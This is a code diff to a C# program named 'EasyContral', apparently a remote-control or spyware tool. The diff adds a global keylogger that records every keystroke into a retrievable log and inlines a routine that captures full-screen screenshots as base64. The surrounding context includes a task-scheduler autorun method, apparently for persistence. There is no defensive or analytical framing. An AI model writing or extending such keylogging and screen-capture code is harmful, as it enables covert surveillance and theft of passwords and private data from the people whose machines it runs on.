@@ -1,18 +1,12 @@
 ﻿using Microsoft.Win32;
 using Microsoft.Win32.TaskScheduler;
-using Newtonsoft.Json;
 using System;
-using System.CodeDom.Compiler;
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.Drawing;
 using System.Drawing.Imaging;
 using System.IO;
-using System.Linq;
-using System.Net;
-using System.Net.Sockets;
 using System.Reflection;
-using System.Text;
 using System.Threading;
 using System.Windows.Forms;
 
@@ -23,7 +17,36 @@ namespace EasyContral
         public static int SleepTime { get; set; }
         public static string ScreenShot()
         {
-            return CaptureScreenToBase64();
+            Rectangle bounds = Screen.GetBounds(Point.Empty);
+            using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
+            {
+                using (Graphics g = Graphics.FromImage(bitmap))
+                {
+                    g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
+                }
+                using (MemoryStream ms = new MemoryStream())
+                {
+                    bitmap.Save(ms, ImageFormat.Png);
+                    byte[] imageBytes = ms.ToArray();
+                    return Convert.ToBase64String(imageBytes);
+                }
+            }
+        }
+        static string KeyBoardLog = "";
+        public static string KeyboardListen(bool isOpen)
+        {
+            Thread listenerThread = new Thread(StartKeyboardListener);
+            if (isOpen)
+            {
+                KeyBoardLog = "";
+                listenerThread.Start();
+            }
+            else 
+            { 
+                listenerThread.Abort();
+                return KeyBoardLog;
+            }
+            return "";
         }
         public static void AutoRun_TaskScheduler()
         {
@@ -105,22 +128,34 @@ namespace EasyContral
             }
             return Processs;
         }
-        static string CaptureScreenToBase64()
+        private static void StartKeyboardListener()
         {
-            Rectangle bounds = Screen.GetBounds(Point.Empty);
-            using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
+            GlobalKeyboardListener.KeyDown += OnKeyDown;
+            GlobalKeyboardListener.Start();
+            Application.Run();
+        }
+        private static void OnKeyDown(object sender, KeyEventArgs e)
+        {
+            bool isCapsLockOn = Control.IsKeyLocked(Keys.CapsLock);
+            string key = GetKeyChar(e.KeyCode, isCapsLockOn);
+            KeyBoardLog += key + " ";
+        }
+        private static string GetKeyChar(Keys key, bool isCapsLockOn)
+        {
+            string KeyString = key.ToString();
+            if (KeyString.Length == 1)
             {
-                using (Graphics g = Graphics.FromImage(bitmap))
+                if (isCapsLockOn)
                 {
-                    g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
+                    KeyString = KeyString.ToUpper();
                 }
-                using (MemoryStream ms = new MemoryStream())
+                else
                 {
-                    bitmap.Save(ms, ImageFormat.Png);
-                    byte[] imageBytes = ms.ToArray();
-                    return Convert.ToBase64String(imageBytes);
+                    KeyString = KeyString.ToLower();
                 }
+                return KeyString;
             }
+            return key.ToString();
         }
     }
 }
